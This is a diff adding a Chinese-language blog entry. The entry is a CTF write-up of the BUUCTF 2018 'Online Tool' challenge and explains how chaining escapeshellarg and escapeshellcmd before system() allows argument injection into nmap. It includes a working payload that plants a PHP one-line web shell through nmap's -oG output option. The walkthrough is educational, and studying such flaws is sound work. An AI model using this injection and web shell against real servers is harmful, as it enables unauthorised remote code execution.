@@ -124,4 +124,59 @@ SameSite：如果为None，可能可用于CSRF攻击。
         <tag>CTF</tag>
       </tags>
   </entry>
+  <entry>
+    <title>RCE</title>
+    <url>/posts/4d9b8a15/</url>
+    <content><![CDATA[<h1 id="PHP-RCE"><a href="#PHP-RCE" class="headerlink" title="PHP RCE"></a>PHP RCE</h1><h2 id="记录一道关于PHP函数漏洞利用的题目"><a href="#记录一道关于PHP函数漏洞利用的题目" class="headerlink" title="记录一道关于PHP函数漏洞利用的题目"></a>记录一道关于PHP函数漏洞利用的题目</h2><blockquote>
+<p><a href="https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool">题目在这里</a>  </p>
+</blockquote>
+<p>创建实例显示源代码如下：  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>进行代码审计，我们发现<br>只要传入host参数，就会进入else逻辑<br>其中存在mkdir命令和chdir命令。</p>
+<p>mkdir命令是确保sandbox存在，不存在就创建一个<br>chair命令是进入到sandbox目录去</p>
+<p><em>$sandbox &#x3D; md5(“glzjin”. $_SERVER[‘REMOTE_ADDR’]);<em>会将</em>glzjin</em>与<em>REMOTE_ADDR</em>中存储的数据进行MD5运算<br>注意到最后一行中出现system()函数进行命令执行，因此我们可以尝试依次作为我们RCE的入手点。<br>其中的 <em>nmap -T5 -sT -Pn –host-timeout 2 -F</em>命令是对$host指定的主机的端口进行扫描</p>
+<p>接下来看看从哪里触发system()函数</p>
+<p>注意到程序中存在escapehsellarg()函数和escapeshellcmd()函数，看看他们可以实现什么样的功能？</p>
+<blockquote>
+<p><a href="http://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/">读这里了解更多</a></p>
+</blockquote>
+<blockquote>
+<p><a href="https://paper.seebug.org/164/">还有这里</a></p>
+</blockquote>
+<p>查阅资料我们发现，在PHP中，为了避免用户输入中的RCE风险，官方在5.2.18以上版本中加入了escapeshellarg()函数用于防止注入参数<br>。其功能为：把字符串转码为可以在 shell 命令里使用的参数。</p>
+<p>原理是：</p>
+<pre><code>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保
+能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。
+</code></pre>
+<p>简单地说，如果输入内容不包含单引号，则直接对输入的字符串添加一对单引号括起来；<br>如果输入内容包含单引号，则先对该单引号进行转义，再对剩余部分字符串添加相应对数的单引号括起来。</p>
+<p>同样的escapeshellcmd()函数也是发挥防止RCE风险的作用。其功能为：shell 元字符转义。</p>
+<p>原理是：    </p>
+<pre><code>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。
+
+反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
+</code></pre>
+<p>简单地说，第一，如果输入内容中上述出现的特殊字符会被反斜杠给转义掉；<br>第二，如果单引号和双引号不是成对出现时，会被转义掉。</p>
+<p>然而，虽然一开始是为了降低风险，但如果出现</p>
+<pre><code>escapeshellarg()
+escapeshellcmd()
+</code></pre>
+<p>的形式，反而会导致进一步的RCE漏洞。<br>因此我们可以从这里入手，从而利用system()函数得到flag<br>我们使用上传一句话木马来连接服务器</p>
+<p>payload：</p>
+<pre><code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;
+</code></pre>
+<p>这个payload的意思是上传一句话木马的同时，将 nmap 的扫描结果保存为 hack.php 文件以免蚁剑连接时返回内容为空。<br>最后蚁剑连接，在根目录下找到flag  </p>
+<h3 id="在这道题目中其他需要注意的是关于转义符的理解："><a href="#在这道题目中其他需要注意的是关于转义符的理解：" class="headerlink" title="在这道题目中其他需要注意的是关于转义符的理解："></a>在这道题目中其他需要注意的是关于转义符的理解：</h3><p>上面提到escapeshellarg()函数会将 单引号进行利用或转义，然后再在两边加上引号引起来。<br>其转义的方式就是在前面加上一个\。同样的，escapeshellcmd()也会在对特殊符号进行转义，即在其前面加上\<br>其目的是让程序认为单引号仅仅作为符号存在，而不作为指令的一部分。</p>
+<p>例如：<br>如果传入</p>
+<pre><code>It&#39;s a dog.
+</code></pre>
+<p>就可能导致多余的’使得程序报错。<br>而使用转义符之后：</p>
+<pre><code>It\&#39;s a dog.
+#等于 &quot;It&#39;s a dog.&quot; 
+</code></pre>
+<p>这时会作为一个完整的字符串进行后续操作。  </p>
+]]></content>
+      <tags>
+        <tag>周报</tag>
+      </tags>
+  </entry>
 </search>
